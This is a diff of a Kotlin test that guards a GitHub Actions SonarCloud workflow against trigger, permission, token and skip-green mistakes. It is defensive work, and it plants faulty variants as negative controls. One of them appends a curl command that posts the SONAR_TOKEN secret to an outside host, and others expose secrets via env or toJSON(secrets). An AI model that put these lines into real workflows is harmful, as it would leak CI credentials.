@@ -2,15 +2,19 @@ import java.io.File
 import org.assertj.core.api.Assertions.assertThat
 import org.assertj.core.api.Assertions.assertThatThrownBy
 import org.junit.jupiter.api.Test
+import org.yaml.snakeyaml.DumperOptions
 import org.yaml.snakeyaml.LoaderOptions
 import org.yaml.snakeyaml.Yaml
+import org.yaml.snakeyaml.constructor.DuplicateKeyException
 
 /**
  * The nightly SonarCloud workflow stays reported only (ADR-0058): it never runs on a pull request or in the merge
  * queue (ADR-0047), the CI gate never calls it (ADR-0023), every action is pinned to a commit and the token reaches
- * only the steps that need it. The workflows are parsed as YAML (snakeyaml reaches the test classpath through
- * `generatorApi`); only the pin comments, which parsing drops, are read from the raw lines. A file that does not
- * parse, or repeats a key, fails the test. Each rule has a negative control: a planted variant of the real file.
+ * only the steps that need it. The guard covers triggers, scope, token, skip-green and pins; it does not cover the
+ * analysis settings (what is built, which sources are scanned). It protects against honest mistakes, not a hostile
+ * editor. The workflows are parsed as YAML (snakeyaml reaches the test classpath through `generatorApi`); only the
+ * pin comments, which parsing drops, are read from the raw lines. A file that does not parse, or repeats a key, fails
+ * the test. Each rule has a negative control: the real workflow with one mutation planted on its parsed structure.
  */
 class SonarWorkflowGuardTest {
 
@@ -22,43 +26,54 @@ class SonarWorkflowGuardTest {
     private val ci get() = File(workflows, "ci.yml").readText()
     private val service get() = File(workflows, "service.yml").readText()
 
+    private val gate = "steps.sonar_token.outputs.enabled == 'true'"
+
     @Test
     fun sonarRunsOnTheScheduleAndOnDispatchOnly() {
         assertThat(Guard.triggers(sonar)).isEmpty()
-        for (trigger in listOf("pull_request", "\"pull_request\"", "workflow_run")) {
-            val planted = sonar.plant("  workflow_dispatch:\n", "  workflow_dispatch:\n  $trigger:\n")
-            assertThat(Guard.triggers(planted)).`as`(trigger).isNotEmpty()
+        for (trigger in listOf("pull_request", "workflow_run")) {
+            assertThat(Guard.triggers(sonar.mutate { sub("on")[trigger] = null })).`as`(trigger).isNotEmpty()
         }
     }
 
     @Test
     fun sonarIsOneJobOnTheCanonicalMainWithReadOnlyPermissions() {
         assertThat(Guard.job(sonar)).isEmpty()
-        val permissions = "permissions:\n  contents: read\n"
         val planted = mapOf(
-            "write-all" to sonar.plant(permissions, "permissions: write-all\n"),
-            "no permissions" to sonar.plant(permissions, ""),
-            "job write" to sonar.plant("    steps:\n", "    permissions:\n      contents: write\n    steps:\n"),
-            "no if" to sonar.plant(Regex("(?m)^ {4}if: .*\n"), ""),
+            "write-all" to sonar.mutate { put("permissions", "write-all") },
+            "no permissions" to sonar.mutate { remove("permissions") },
+            "job write" to sonar.mutate { job()["permissions"] = mapOf("contents" to "write") },
+            "no if" to sonar.mutate { job().remove("if") },
+            "wrapped half" to sonar.mutate { job()["if"] = "\${{ github.ref == 'refs/heads/main' }} && github.repository == 'spec-kitty/spec-kitty-charter'" },
         )
         planted.forEach { (name, text) -> assertThat(Guard.job(text)).`as`(name).isNotEmpty() }
     }
 
     @Test
+    fun sonarScansTheTrustedCodeAndReportsIt() {
+        assertThat(Guard.scope(sonar)).isEmpty()
+        val planted = mapOf(
+            "no scan" to sonar.mutate { job().steps().removeIf { it["id"] == "scan" } },
+            "no summary" to sonar.mutate { job().steps().removeIf { "GITHUB_STEP_SUMMARY" in it["run"].toString() && it["id"] == null } },
+            "checkout of a pull request" to sonar.mutate {
+                job().steps().first { "checkout@" in it["uses"].toString() }.sub("with")["ref"] = "refs/pull/1/merge"
+            },
+        )
+        planted.forEach { (name, text) -> assertThat(Guard.scope(text)).`as`(name).isNotEmpty() }
+    }
+
+    @Test
     fun theTokenReachesOnlyTheProbeTheScanAndTheGate() {
         assertThat(Guard.token(sonar)).isEmpty()
-        val verify = "        run: ./gradlew verifyAll"
-        val scan = "        uses: SonarSource/sonarqube-scan-action@22918119ff8e1ca75a623e15c8296b6ea4fbe28f # v8.2.1\n"
-        val gateEnv = Regex("(?<=quality-gate-action@\\S{40} # v\\d\\S{0,20}\n)\\s+env:\n\\s+SONAR_TOKEN: .*\n")
         val planted = mapOf(
-            "secret on Verify" to sonar.plant(verify, "        env:\n          T: \${{ secrets.sonar_token }}\n$verify"),
-            "toJSON(secrets)" to sonar.plant(verify, "        env:\n          T: \${{ toJSON(secrets) }}\n$verify"),
-            "scan as a run" to sonar.plant(scan, "        run: ./gradlew sonar\n"),
-            "probe sends the token" to sonar.plant(
-                "            echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"\n",
-                "            echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"\n            curl -d \"\$SONAR_TOKEN\" example.org\n",
-            ),
-            "gate without env" to sonar.plant(gateEnv, ""),
+            "secret on Verify" to sonar.mutate { job().step("build").env()["T"] = "\${{ secrets.sonar_token }}" },
+            "toJSON(secrets)" to sonar.mutate { job().step("build").env()["T"] = "\${{ toJSON(secrets) }}" },
+            "scan as a run" to sonar.mutate { job().step("scan").apply { remove("uses"); put("run", "./gradlew sonar") } },
+            "probe sends the token" to sonar.mutate { job().probe().appendToRun("curl -d \"\$SONAR_TOKEN\" example.org") },
+            "probe tests the opposite" to sonar.mutate {
+                job().probe().let { it["run"] = it["run"].toString().plant("-n \"\$SONAR_TOKEN\"", "-z \"\$SONAR_TOKEN\"") }
+            },
+            "gate without env" to sonar.mutate { job().step("quality_gate").remove("env") },
         )
         planted.forEach { (name, text) -> assertThat(Guard.token(text)).`as`(name).isNotEmpty() }
     }
@@ -66,23 +81,19 @@ class SonarWorkflowGuardTest {
     @Test
     fun theRunSkipsGreenWithoutTheTokenAndNeverTurnsRed() {
         assertThat(Guard.neverRed(sonar)).isEmpty()
-        val enabledFalse = "            echo \"enabled=false\" >> \"\$GITHUB_OUTPUT\"\n"
-        val javaIf = "        id: java\n        if: steps.sonar_token.outputs.enabled == 'true'\n"
-        val javaGate = "        if: steps.sonar_token.outputs.enabled == 'true'\n"
+        fun afterTheProbe(change: M.() -> Unit) = sonar.mutate { job().steps()[1].change() }
         val planted = mapOf(
-            "exit in the probe" to sonar.plant(enabledFalse, "$enabledFalse            exit 1\n"),
-            "unconditional enabled=true" to sonar.plant(
-                "          if [ -n \"\$SONAR_TOKEN\" ]; then\n",
-                "          echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"\n          if [ -n \"\$SONAR_TOKEN\" ]; then\n",
-            ),
-            "second job" to "$sonar\n  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n",
-            "always() or the token" to sonar.plant(javaIf, javaIf.replace("if: ", "if: always() || ")),
-            "negated gate" to sonar.plant(javaIf, "        id: java\n        if: \"!(steps.sonar_token.outputs.enabled == 'true')\"\n"),
-            "continue-on-error under with" to sonar
-                .plant("        id: java\n$javaGate        continue-on-error: true\n", "        id: java\n$javaGate")
-                .plant("        with:\n          distribution: temurin\n", "        with:\n          continue-on-error: true\n          distribution: temurin\n"),
-            "always() alone" to sonar.plant(javaIf, "        id: java\n        if: always()\n"),
-            "job not continue-on-error" to sonar.plant("    continue-on-error: true\n    steps:\n", "    steps:\n"),
+            "exit in the probe" to sonar.mutate { job().probe().appendToRun("exit 1") },
+            "unconditional enabled=true" to sonar.mutate { job().probe().appendToRun("echo \"enabled=true\" >> \"\$GITHUB_OUTPUT\"") },
+            "second job" to sonar.mutate { sub("jobs")["extra"] = mutableMapOf("runs-on" to "x", "steps" to listOf(mapOf("run" to "echo"))) },
+            "always() or the gate" to afterTheProbe { put("if", "always() || $gate") },
+            "negated gate" to afterTheProbe { put("if", "!($gate)") },
+            "gate in a negated group" to afterTheProbe { put("if", "!(a == 'b' && $gate && c == 'd')") },
+            "gate then always() alternative" to afterTheProbe { put("if", "$gate && !cancelled() || always()") },
+            "wrapped half of the condition" to afterTheProbe { put("if", "\${{ !cancelled() }} && $gate") },
+            "continue-on-error under with" to afterTheProbe { remove("continue-on-error"); sub("with")["continue-on-error"] = true },
+            "always() alone" to afterTheProbe { put("if", "always()") },
+            "job not continue-on-error" to sonar.mutate { job().remove("continue-on-error") },
         )
         planted.forEach { (name, text) -> assertThat(Guard.neverRed(text)).`as`(name).isNotEmpty() }
     }
@@ -107,28 +118,50 @@ class SonarWorkflowGuardTest {
         assertThat(Guard.gateNeeds(ci)).isNotEmpty()
         assertThat(Guard.gate(ci)).isEmpty()
         assertThat(Guard.gate(service)).isEmpty()
-        val calls = ci.plant("  gate:\n", "  sonar:\n    name: Sonar\n    uses: ./.github/workflows/sonar.yml\n\n  gate:\n")
-        val waits = ci.plant("    needs: [changes, service, native, docs]\n", "    needs: [changes, service, native, docs, sonar]\n")
+        val calls = ci.mutate { sub("jobs")["sonar"] = mutableMapOf("uses" to "./.github/workflows/sonar.yml") }
+        val waits = ci.mutate { (sub("jobs").sub("gate")["needs"] as MutableList<Any?>).add("sonar") }
         assertThat(Guard.gate(calls)).`as`("calls").isNotEmpty()
         assertThat(Guard.gate(waits)).`as`("waits").isNotEmpty()
     }
 
     @Test
-    fun aWorkflowThatDoesNotParseOrRepeatsAKeyFailsTheCheck() {
-        assertThatThrownBy { Guard.parse("$sonar\n  : [") }.isNotNull()
-        assertThatThrownBy { Guard.parse(sonar.plant("permissions:\n  contents: read\n", "permissions:\n  contents: read\npermissions:\n  contents: read\n")) }
-            .isNotNull()
+    fun aWorkflowThatRepeatsAKeyFailsTheCheck() {
+        val repeated = sonar.plant("permissions:\n  contents: read\n", "permissions:\n  contents: read\npermissions:\n  contents: read\n")
+        assertThatThrownBy { Guard.parse(repeated) }.isInstanceOf(DuplicateKeyException::class.java)
     }
+}
 
-    private fun String.plant(anchor: Regex, replacement: String): String {
-        check(anchor.findAll(this).count() == 1) { "the plant anchor is gone or ambiguous, update the test: $anchor" }
-        return anchor.replaceFirst(this, replacement)
-    }
+private typealias M = MutableMap<String, Any?>
 
-    private fun String.plant(anchor: String, replacement: String): String {
-        check(split(anchor).size == 2) { "the plant anchor is gone or ambiguous, update the test: ${anchor.trim()}" }
-        return replace(anchor, replacement)
-    }
+@Suppress("UNCHECKED_CAST")
+private fun M.sub(key: String): M = this[key] as M
+
+private fun M.job(): M = sub("jobs").values.single() as M
+
+@Suppress("UNCHECKED_CAST")
+private fun M.steps(): MutableList<M> = this["steps"] as MutableList<M>
+
+private fun M.step(id: String): M = steps().first { it["id"] == id }
+
+private fun M.probe(): M = steps().first()
+
+private fun M.env(): M = getOrPut("env") { mutableMapOf<String, Any?>() }.let { @Suppress("UNCHECKED_CAST") (it as M) }
+
+private fun M.appendToRun(line: String) {
+    this["run"] = this["run"].toString() + "\n" + line + "\n"
+}
+
+/** The workflow parsed, changed and written back: a planted variant that does not depend on how the file is laid out. */
+@Suppress("UNCHECKED_CAST")
+private fun String.mutate(change: M.() -> Unit): String {
+    val doc = Guard.parse(this) as M
+    doc.change()
+    return Yaml(DumperOptions().apply { defaultFlowStyle = DumperOptions.FlowStyle.BLOCK; width = Int.MAX_VALUE }).dump(doc)
+}
+
+private fun String.plant(anchor: String, replacement: String): String {
+    check(split(anchor).size == 2) { "the plant anchor is gone or ambiguous, update the test: ${anchor.trim()}" }
+    return replace(anchor, replacement)
 }
 
 /** Rules over a parsed workflow; each returns its violations. The expressions are read by their top-level terms. */
@@ -152,12 +185,16 @@ private object Guard {
 
     private fun jobs(doc: Map<*, *>) = doc["jobs"].map().entries.associate { it.key.toString() to it.value.map() }
     private fun steps(job: Map<*, *>) = job["steps"].list().map { it.map() }
-    private fun stepsOf(doc: Map<*, *>) = jobs(doc).values.flatMap(::steps)
     private fun Map<*, *>.id() = this["id"]?.toString()
 
-    /** The terms of an `if` joined by `&&`, or null when it has a top-level `||`; whitespace and `${{ }}` removed. */
+    /**
+     * The terms of an `if` joined by `&&`, whitespace removed. Null when the condition has a top-level `||`, or a
+     * `${{` or `}}` beyond the one pair that may wrap all of it (GitHub reads `${{ a }} && b` as a string, always true).
+     */
     private fun terms(condition: Any?): List<String>? {
-        val raw = condition?.toString()?.trim().orEmpty().removePrefix("\${{").removeSuffix("}}")
+        var raw = condition?.toString()?.trim().orEmpty()
+        if (raw.startsWith("\${{") && raw.endsWith("}}")) raw = raw.removePrefix("\${{").removeSuffix("}}")
+        if ("\${{" in raw || "}}" in raw) return null
         val alternatives = split(raw, "||")
         return if (alternatives.size == 1) split(alternatives.single(), "&&") else null
     }
@@ -183,6 +220,20 @@ private object Guard {
             i++
         }
         return (parts + text.substring(start)).map { it.filterNot(Char::isWhitespace) }
+    }
+
+    /** The run does something: a scan, its gate and a summary exist, and the first checkout is the trusted code. */
+    fun scope(text: String): List<String> {
+        val steps = jobs(parse(text)).values.singleOrNull()?.let(::steps) ?: return listOf("expected exactly one job")
+        val checkout = steps.firstOrNull { it["uses"]?.toString()?.startsWith("actions/checkout@") == true }
+        return listOfNotNull(
+            if (steps.none { it.id() == "scan" }) "there is no scan step" else null,
+            if (steps.none { it.id() == "quality_gate" }) "there is no quality gate step" else null,
+            if (steps.drop(1).none { "GITHUB_STEP_SUMMARY" in it["run"].toString() }) "there is no summary step" else null,
+            if (checkout == null) "there is no checkout" else null,
+            if (checkout != null && checkout["with"].map().keys.any { it in setOf("ref", "repository") })
+                "the first checkout is not the trusted code (it sets ref or repository)" else null,
+        )
     }
 
     fun triggers(text: String): List<String> {
@@ -242,7 +293,7 @@ private object Guard {
     /** The probe names the token only to test it for emptiness or inside an echoed message. */
     private fun probeScript(script: String): List<String> =
         script.lines().filter { Regex("""(?i)sonar_token""").containsMatchIn(it) }.mapNotNull { line ->
-            val test = Regex("""^\s*if \[ -[nz] "[$]SONAR_TOKEN" ]; then\s*$""").matches(line)
+            val test = Regex("""^\s*if \[ -n "[$]SONAR_TOKEN" ]; then\s*$""").matches(line)
             val notice = line.trimStart().startsWith("echo ") && !Regex("""[$]\{?SONAR_TOKEN""").containsMatchIn(line)
             if (test || notice) null else "the probe uses the token: ${line.trim()}"
         }
@@ -279,7 +330,7 @@ private object Guard {
             if ("enabled=true" in line && branch != "then") violations += "the probe enables outside the token branch"
             if ("enabled=false" in line && branch != "else") violations += "the probe disables outside the else branch"
         }
-        if ("enabled=false" !in script) violations += "the probe never writes enabled=false"
+        if ("enabled=true" !in script || "enabled=false" !in script) violations += "the probe does not write both outcomes"
         steps.drop(1).forEach { step ->
             val name = step["name"] ?: step.id()
             if (step["continue-on-error"] != true) violations += "$name is not continue-on-error"
